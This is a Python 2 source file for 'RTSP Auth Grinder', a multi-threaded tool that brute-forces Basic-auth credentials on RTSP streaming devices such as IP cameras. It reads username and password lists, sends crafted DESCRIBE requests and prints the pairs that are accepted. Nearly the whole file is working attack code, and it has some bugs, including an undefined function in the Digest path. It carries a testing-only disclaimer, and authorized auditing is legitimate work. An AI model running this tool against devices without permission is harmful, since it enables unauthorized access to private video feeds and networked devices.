# RTSP Auth Grinder
# USAGE: rtsp_authgrind [-l username | -L username_file] [-p password | -P password_file] <target ip[:port]>
# Author: TekTengu
# Copyright (C) 2014 Luke Stephens and Tek Security Group, LLC - all rights reserved

"""
	rtsp_authgrind.py - A quick and simple tool to brute force credentials on rtsp
	services and devices. This is a multi-threaded brute forcing tool for testing,
	assessment and audit purposes only.
	
	Copyright (C) 2014 Luke Stephens and Tek Security Group, LLC - all rights reserved
	
	This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	RTSP Authentication Grinder is provided for testing purposes only and is not 
	authorized for use to conduct malicious, illegal or other nefarious activities.
	
	Standard usage is:
	
	python rtsp_authgrind [- l username | -L username list file] [-p password 
	| -P password list file] <target ip [:port]>
	
	A few things to know:
	1. rtsp devices can be overwhelmed so these default settings could easily cause an
	error: "Resource temporarily unavailable". Note there may be a bug that skips the
	checks when this happens, I am tracking that down.
	
	2. Starving the threads can happen (they block) if the THREADBLOCKSIZE is small. So
	if you have 10 threads and a block size of 10, you could get some of those threads
	doing a large amount of blocking on getting new work items, versus actually doing
	checks. I like the larger block size like 30, 50, 100... But it will have to depend
	on the number you have.
	
	3. This ONLY does BASIC auth right now. I have hooks in to do DIGEST auth later (see
	to do list)
"""

import base64
import socket
import sys
from optparse import OptionParser
import os.path
import threading
import time
import select

PORT = 554
IP = ""
THREADS = 50
USERS = []
PASSWORDS = []
THREADBLOCKSIZE = 100
COREPACKET = ""
SLEEPTIME = 5

def read_in_users(user_file_str):
	uarr = []
	if os.path.isfile(user_file_str):
		f = open(user_file_str, 'r')
		for line in f:
			uarr.append(line.strip())
		f.close
	return uarr
	
def read_in_passwords(pass_file_str):
	parr = []
	if os.path.isfile(pass_file_str):
		f = open(pass_file_str, 'r')
		for line in f:
			parr.append(line.strip())
		f.close
	return parr
	
def is_Unauthorized(s):
	return '401 Unauthorized' in s
	
def is_Authorized(s):
	return '200 OK' in s
	
def use_Basic_Auth(s):
	return 'WWW-Authenticate: Basic' in s

def use_Digest_Auth(s):
	return 'WWW-Authenticate: Digest' in s
	
def create_core_packet():
	global COREPACKET
	if len(COREPACKET) <= 0:
		COREPACKET = 'DESCRIBE rtsp://%s RTSP/1.0\r\n' % IP
		COREPACKET += 'CSeq: 2\r\n'
	return COREPACKET
	
def create_test_packet():
    return create_core_packet() + "\r\n"
	
def create_basic_packet(user, password):
    ecreds = base64.b64encode(user + ":" + password)
    setup_pkt = create_core_packet()
    setup_pkt += 'Authorization: Basic ' + ecreds + '\r\n\r\n'
    return setup_pkt
	
def create_digest_packet(user,password):
    pass

class ThreadedList(threading.Thread):
	def __init__(self, list):
		threading.Thread.__init__(self)
		self.list = list
		self.found = []
	
	def getSubList(self, size):
		listtoreturn = []
		if self.hasItems():
			if len(self.list) >= size:
				listtoreturn = self.list[:size]
				self.list = self.list[size:]
			else:
				listtoreturn = self.list[:]
				self.list = []
		return listtoreturn
		
	def getWorkSize(self):
		return len(self.list)
	
	def hasItems(self):
		return len(self.list) > 0
		
	def addFound(self, str):
		#print "adding item " + str
		self.found.append(str)
		
	def hasFound(self):
		#print "hasFound has size " + str(len(self.found))
		return len(self.found) > 0
		
	def getAllFoundAndClear(self):
		#print "doing foundAndClear"
		listtoreturn = self.found[:]
		self.found = []
		return listtoreturn


class AuthThreader(threading.Thread):
	
    def __init__(self, creator, glist, lock):
        threading.Thread.__init__(self)
        self.creator = creator
        #self.avgRunTime = -1
        self.workingList = glist
        self.lock = lock
        self.done = False
    	
    #def getAvgRunTime(self):
    	#return self.avgRunTime
    	
    def forceDone(self):
    	self.done = True
 
    def run(self):
    	while not self.done:
    		try:
    			#print "acquiring lock"
    			self.lock.acquire()
    			#print "lock acquired"
    			list = self.workingList.getSubList(THREADBLOCKSIZE)
    		finally:
    			self.lock.release()
    			#print "lock released"
    		total = len(list)
    		if total > 0:
    			#print "total greater than 0"
    			#start = time.time()
    			self.perform_rtsp_auth(list)
    			#end = time.time()
    			#self.avgRunTime = (end - start) / total
    		else:
    			done = True

    def perform_rtsp_auth(self, list):
    	try:
    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    		#s.settimeout(15.0)
    		s.setblocking(1)
    		s.connect((IP, PORT))
    		s.setblocking(0)
    		for pair in list:
    			#print "attempting to connect to " + str(IP) + " on port " + str(PORT)
    			user = pair[0]
    			password = pair[1]
    			#print "doing pair " + user + "," + password
    			pkt = self.creator(user, password)
    			s.sendall(pkt)
    			#print 'Packet: ' + pkt
    			#print 'Packet sent'
    			inputready, outputready, exceptready = select.select([s], [], [], 5)
    			data = s.recv(1024)
    			#print data
    			if is_Authorized(data):
    				print "Found one"
    				pstr = "======================= Possible Success =========================\n"
    				pstr += "User name: " + user + "\n"
    				pstr += "Password: " + password + "\n"
    				pstr += "Returns:\n"
    				pstr += repr(data) + "\r\n\n\n"
    				try:
    					self.lock.acquire()
    					self.workingList.addFound(pstr)
    				finally:
    					self.lock.release()
    	except KeyboardInterrupt, ki:
    		print "The run was interrupted by the user pressing Ctl-C"
    		raise KeyboardInterrupt(ki)
    	except socket.timeout, e:
    		print "The connection timed out trying to reach the IP provided."
    		print e
    	except socket.error, e:
    		print "There is an error encountered in the network communication"
    		print e
    	except Exception, e:
    		print "There was some error thrown not sure what..."
    		print e
        	
def checkForFoundAndPrint(lock, list):
	try:
		#print "in found and print"
		lock.acquire()
		if list.hasFound():
			#print "has found..."
			for s in list.getAllFoundAndClear():
				print s
	finally:
		lock.release()
	
def test_auth_and_run():
	pkt = create_test_packet()
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5)
		s.connect((IP, PORT))
		s.sendall(pkt)
		data = s.recv(1024)
	except KeyboardInterrupt :
		print "The run was interrupted by the user pressing Ctl-C"
		return
	except socket.timeout :
		print "The test timed out trying to reach the IP provided. Check your IP and network and try again"
		return
	except socket.error :
		print "There is a networking problem. Please check your network and try again"
		return
	rstr = repr(data)
	found = False
	if is_Unauthorized(rstr):
		masterList = []
		for user in users:
			for password in passwords:
				masterList.append((user, password))
		if use_Basic_Auth(rstr):
			workingList = masterList[:]
			print "Basic Auth is supported and starting run with Basic Auth..."
			creator = create_basic_packet
			runners = []
			lock = threading.Lock()
			workQueue = ThreadedList(workingList)
			try:
				startSize = workQueue.getWorkSize()
				for x in range(0, THREADS):
					runner = AuthThreader(creator, workQueue, lock)
					runners.append(runner)
					runner.start()
				count = 1
				firstPass = True
				while True:
					#totalTimes = 0.0
					#for runner in runners:
						#avgTime = runner.getAvgRunTime()
						#if avgTime > -1:
							#count += 1
							#totalTimes += avgTime
					checkForFoundAndPrint(lock, workQueue)
					#print "Starting Working Queue size is " + str(startSize)
					#if count > 0:
						#averageRunTime = totalTimes / count
						#print "Average time per check is ", averageRunTime, " secs. Run rate is " + str(averageRunTime * 100 * THREADS) + " per sec!\r"
					time.sleep(SLEEPTIME)
					endSize = workQueue.getWorkSize()
					#print "Ending Working Queue size is " + str(endSize)
					numCompleted = startSize - endSize
					if numCompleted > 0 and not firstPass:
						cps = numCompleted / (SLEEPTIME * count)
						ttc = endSize / cps * 60
						#print "Current rate is " + str(cps) + " checks per second."
						#print "Time to completion is " + str(ttc) + " minutes."
						startSize = endSize
						count = 1
					else:
						count += 1
					if firstPass == True:
						firstPass = False
					try:
						lock.acquire()
						hasItems = workQueue.hasItems()
					finally:
						lock.release()
					if not hasItems:
						break
				checkForFoundAndPrint(lock, workQueue)
			except KeyboardInterrupt :
				print "The run was interrupted by the user pressing Ctl-C"
				sys.exit(0)
			except socket.timeout :
				print "The test timed out trying to reach the IP provided. Check your IP and network and try again"
			except socket.error :
				print "There is a networking problem. Please check your network and try again"
			except Exception, e :
				print "There is some other exception being thrown"
				print repr(e)
			finally:
				for runner in runners:
					runner.forceDone()
					runner.join(2)
				#print "Check found in second finally"
				checkForFoundAndPrint(lock, workQueue)
				return
			print "End of run with Basic Auth..."
		elif use_Digest_Auth(rstr) and not found:
			print "Digest Auth is supported and starting run with Digest Auth..."
			creator = create_digest_packet
			for user in users:
				for password in passwords:
					perform_rtsp_auth(user, password, creator)
			print "End of run with Digest Auth..."
	else:
		print "The RTSP service at: " + IP + ":" + PORT + " allows unauthorized access and does not need a username/password"


if __name__ == '__main__':
	print "\n\n     rtsp_authgrinder.py - Brute forcing tool for RTSP Protocol"
	print "   Copyright (C) 2014 Luke Stephens and Tek Security Group, LLC"
	print "   This program comes with ABSOLUTELY NO WARRANTY. This is free software, and"
	print "   you are welcome to use and redistribute it under certain conditions. See"
	print "   the license file provided with the distribution,"
	print "   or https://github.com/tektengu/rtsp_authgrinder/license.txt\n\n"
	parser = OptionParser()
	parser.add_option('-l', dest='user',
						help='single user name to authenticate with', metavar='USER')
	parser.add_option('-L', dest='user_file',
						help='user name file to authenticate with', metavar='USER_FILE')
	parser.add_option('-p', dest='password',
						help='single password to authenticate with', metavar='PASSWORD')
	parser.add_option('-P', dest='password_file',
						help='password file to authenticate with', metavar='PASS_FILE')
						
	(options, args) = parser.parse_args()
	if options.user == None and options.user_file == None:
		parser.error("you must provide either a user or user file to authenticate with")
	if options.user and options.user_file:
		parser.error("you must suppy either a single user or a user name file, not both")
	if options.password == None and options.password_file == None:
		parser.error("you must provide a password or password file to authenticate with")
	if options.password and options.password_file:
		parser.error("you must supply either a single password or password file, not both")
	if len(args) != 1:
		parser.error("you must supply an ip and optional port")
	users = []
	passwords = []
	ipport = args[-1]
	sep = ipport.find(":")
	if sep > 0:
		IP = ipport[:sep]
		PORT = int(ipport[sep + 1 :])
	else:
		IP = ipport
	if options.user:
		users.append(options.user)
	if options.user_file:
		users = read_in_users(options.user_file)
	if options.password:
		passwords.append(options.password)
	if options.password_file:
		passwords = read_in_passwords(options.password_file)
	print "********************************************************************************"
	print "Starting RTSP Auth Grinder on IP: " + IP + " and PORT: " + str(PORT)
	print "Running with %d threads" % THREADS
	print "There are %s user names to test" % str(len(users))
	print "There are %s passwords to test" % str(len(passwords))
	print "Total combinations to test are " + str(len(users) * len(passwords))
	print "********************************************************************************"
	test_auth_and_run()